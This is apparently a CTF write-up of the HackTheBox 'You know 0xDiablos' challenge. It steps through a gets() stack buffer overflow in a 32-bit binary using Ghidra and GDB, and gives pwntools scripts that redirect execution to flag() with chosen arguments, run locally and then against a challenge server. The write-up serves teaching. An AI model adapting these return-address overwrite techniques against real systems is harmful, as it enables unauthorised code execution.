# Challenge Description
I missed my flag!

## Enumeration
Before we begin enumeration, `unzipping` the downloaded file might be lil' bit trickier, so I thought I'll mention it.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos]
└─$ unzip You\ know\ 0xDiablos.zip
Archive:  You know 0xDiablos.zip
   skipping: vuln                    need PK compat. v5.1 (can do v4.6)

```

After googling, i found out [this] article, which addresses the problem and also provides the solution to it.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos]
└─$ 7za x You\ know\ 0xDiablos.zip 

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD Ryzen 7 4800HS with Radeon Graphics          (860F01),ASM,AES-NI)

Scanning the drive for archives:
1 file, 3058 bytes (3 KiB)

Extracting archive: You know 0xDiablos.zip
--
Path = You know 0xDiablos.zip
Type = zip
Physical Size = 3058

    
Enter password (will not be echoed):
Everything is Ok

Size:       15656
Compressed: 3058
```

The file provided, `Vuln`, is a `32-bit Unix` file hence make sure you have the correct system to run it. I used Kali Linux to run this file.

After knowing that it's a 32-bit Unix ELF (executable) file, I made the file executable using the `chmod` command and ran it.

```                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos]
└─$ chmod +x vuln        
                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos]
└─$ ./vuln                   
You know who are 0xDiablos: 
yes
yes
                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos]
└─$ ./vuln
You know who are 0xDiablos: 
No
No

```

Since, it is an executable file, we can open it up in `Ghidra` and disassemble it.

When I first opened up the file vuln on Ghidra and look through the code, I noticed that this is a `buffer overflow (BOF)` challenge. A char array is declared but there is no limit to the number of characters being read due to gets().

Decompilation for `main`:

```
undefined4 main(void)
{
  __gid_t __rgid;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

An interestingly named function `vuln`.

Here is the code prepared by Ghidra for the `vuln`
```

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}

```

In a typical Buffer Overflow (BOF) Attacks, we just need to provide a huge string to the program, so that it crashes and we can retrieve the flag.

Similarly, we can use the same technique here by let's say printing a lots of  `A's` and passing it to the `./vuln` program

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos]
└─$ python3 -c "print('A'* 200)" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: done                python3 -c "print('A'* 200)" | 
zsh: segmentation fault  ./vuln
```

If we launch `GDB`, we can use the `info file` command to see the `entry point’s` address. True enough, the entry point matches the address of `start()`.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos]
└─$ gdb vuln
GNU gdb (Debian 12.1-3) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) r
Starting program: /home/kali/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
You know who are 0xDiablos: 
^C
Program received signal SIGINT, Interrupt.
0xf7fc5559 in __kernel_vsyscall ()
(gdb) info file
Symbols from "/home/kali/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos/vuln".
Native process:
        Using the running image of child Thread 0xf7fc0500 (LWP 7685).
        While running this, GDB does not access memory from...
Local exec file:
        `/home/kali/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos/vuln', file type elf32-i386.
        __Entry point__: __0x80490d0__
        0x08048194 - 0x080481a7 is .interp
       
--Type <RET> for more, q to quit, c to continue without paging--

```

Setting the breakpoint before and after `gets()`, we will be able to analyze the stack to ensure we only need `184` bytes `(local_bc needs 180 bytes + 4 bytes of register EBP)` to reach the location of the `return` (RET) address

```

                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined _start()
             undefined         AL:1           <RETURN>
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     080490d9(*)  
                             _start                                          XREF[5]:     Entry Point(*), 08048018(*), 
                                                                                          0804a06c, 0804a0cc(*), 
                                                                                          _elfSectionHeaders::00000214(*)  
        __080490d0 31 ed__           XOR        EBP,EBP
        080490d2 5e              POP        ESI
        080490d3 89 e1           MOV        ECX,ESP

```

We can set the breakpoints as shown below before running the program again.

```
(gdb) b *0x08049291
Breakpoint 1 at 0x08049291
(gdb) b *0x08049296
Breakpoint 2 at 0x0804296
(gdb) r
```

When we analyze the stack using the command `x/60x $esp` we can see the return address of `vuln()` located at `0xffffd0cc` on the stack (see the red box in Fig 5e). The return address can be proven by comparing it with the next instruction in `main()` after calling `vuln()`.

```
Breakpoint 1 at 0x8049291
(gdb) b *0x08049296
Breakpoint 2 at 0x8049296
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
You know who are 0xDiablos: 

Breakpoint 1, 0x08049291 in vuln ()
(gdb) x/60x $esp
0xffffcf40:     0xffffcf50      0xf7fa1de7      0x00000001      0x08049281
0xffffcf50:     0xf7fa1da0      0x000007d4      0x00000001      0xf7fa0ff4
0xffffcf60:     0xf7fa1da0      0x000007d4      0x0000001c      0x00000001
0xffffcf70:     0x0000000a      0xf7fa0ff4      0xffffcff8      0xf7dfbdb7
0xffffcf80:     0xf7fa1da0      0x0000001c      0xf7fa1da0      0xf7dfc1c3
0xffffcf90:     0xf7fa1da0      0xf7fa1de7      0x00000001      0x00000001
0xffffcfa0:     0x00000001      0x00000020      0xf7dfcb49      0xf7f9fa40
0xffffcfb0:     0xf7fa1da0      0xf7fa0ff4      0xffffcff8      0xf7df0feb
0xffffcfc0:     0xf7fa1da0      0x0000000a      0x0000001c      0xf7e5af7d
0xffffcfd0:     0xf7d8de18      0x000007d4      0xf7fa1e3c      0x0000001c
0xffffcfe0:     0xffffd028      0xf7fd9a80      0x00000000      0x0804c000
0xffffcff0:     0xffffd0f4      0xf7ffcb80      0xffffd028      0x08049310
0xffffd000:     0x0804a038      0x0804c000      0xffffd028      0x08049318
0xffffd020:     0xffffd040      0xf7fa0ff4      0xf7ffd020      0xf7da13b5
(gdb) 
```
(-> 0x08049318)


```
        08049313 e8 5a ff        CALL       vuln                                             undefined vuln()
                 ff ff

```

As we continue the program on GDB, I inputted 184 ‘A’s and see the content of the stack again. However, 4 more bytes of ‘A’s are required to reach right before the return address

```
(gdb) c
Continuing.                                                                                                                                                 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, 0x08049296 in vuln ()
(gdb) x/60x $esp
0xffffcf40:     0xffffcf50      0xf7fa1de7      0x00000001      0x08049281
0xffffcf50:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcf60:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcf70:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcf80:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcf90:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfa0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfc0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfd0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfe0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcff0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd000:     0x41414141      0x41414141      0xffffd000      0x08049318
0xffffd010:     0xffffd050      0xf7fbf66c      0xf7fbfb10      0x000003e8
0xffffd020:     0xffffd040      0xf7fa0ff4      0xf7ffd020      0xf7da13b5
```

Here, last `0x41414141` (in 3rd column, 3rd last row)  is the last 4 bytes of ‘A’s we overflowed, and `0x08049318` (last column, 3rd last row) is the return address of `vuln()`

As I analyzed the functions of the program, I notice the `flag()` function which will help to print the flag to us 

```

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

This allows us to build our script to inject the exploit locally until the `flag()` function is called. Experiment with the endian format allows me to discover that the program stores/read content on the stack in the `little-endian` format. We can easily obtain the address of `flag()` using the symbols directory that gives us the address in an `integer` type. Pack it using `p32()` since we need a `32-bit` address. Running the code below will print to us “Hurry up and try in on server side.”

```python
from pwn import *

context.update(arch="i386", os="linux")

elf = ELF("./vuln")

# offset to reach right before return address's location
offset = b"A" * 188

# craft exploit: offset + flag()
exploit = offset + p32(elf.symbols['flag'], endian="little")

r = elf.process()
r.sendlineafter(":", exploit)
r.interactive()
```

To print the flag, `two` parameters are required. This can easily be seen on Ghidra’s assembly code where the hexadecimal are converted properly. 

![diablo-1](https://user-images.githubusercontent.com/87711310/211170810-f06a04bd-96c9-433c-8750-869e1b96bfe5.png)

Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.

```python 
from pwn import *

context.update(arch="i386", os="linux")

elf = ELF("./vuln")

# offset to reach right before return address's location
offset = b"A" * 188

# craft exploit: offset + flag() + padding + parameter 1 + parameter 2
exploit = offset + p32(elf.symbols['flag'], endian="little") + p32(0x90909090) + p32(0xdeadbeef, endian="little") + p32(0xc0ded00d, endian="little")

r = elf.process()
r.sendlineafter(":", exploit)
r.interactive()
```

Remember to create flag.txt and input some content in it for testing. The code above should cause the content you have entered in your file to be printed.

Lastly, we can change the connection to the actual server given to us instead of creating a process of the local vuln file.

```python
from pwn import *

context.update(arch="i386", os="linux")

elf = ELF("./vuln")

# offset to reach right before return address's location
offset = b"A" * 188

# craft exploit: offset + flag() + padding + parameter 1 + parameter 2
exploit = offset + p32(elf.symbols['flag'], endian="little") + p32(0x90909090) + p32(0xdeadbeef, endian="little") + p32(0xc0ded00d, endian="little")

r = remote("178.62.61.23", 32355)
#r = elf.process()
r.sendlineafter(":", exploit)
r.interactive()
```
Here, we go...
```
└─$ python exploit.py
[*] '/home/kali/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos/vuln'
[*] '/home/kali/Desktop/HackTheBox/Beginner-Path/You-know-0xDiablos/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to 178.128.37.153 on port 31718: Done
/home/kali/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xde\xc0AAAAAAAAAAAAAAAAAAAA\xe2\x9\x90\x90\x90\x90ﾭ\xdeBuff3r_1s_not_healthy}[*] Got EOF while reading in interactive
HTB{REDACTED}[*] Got EOF while reading in interactive
 

```
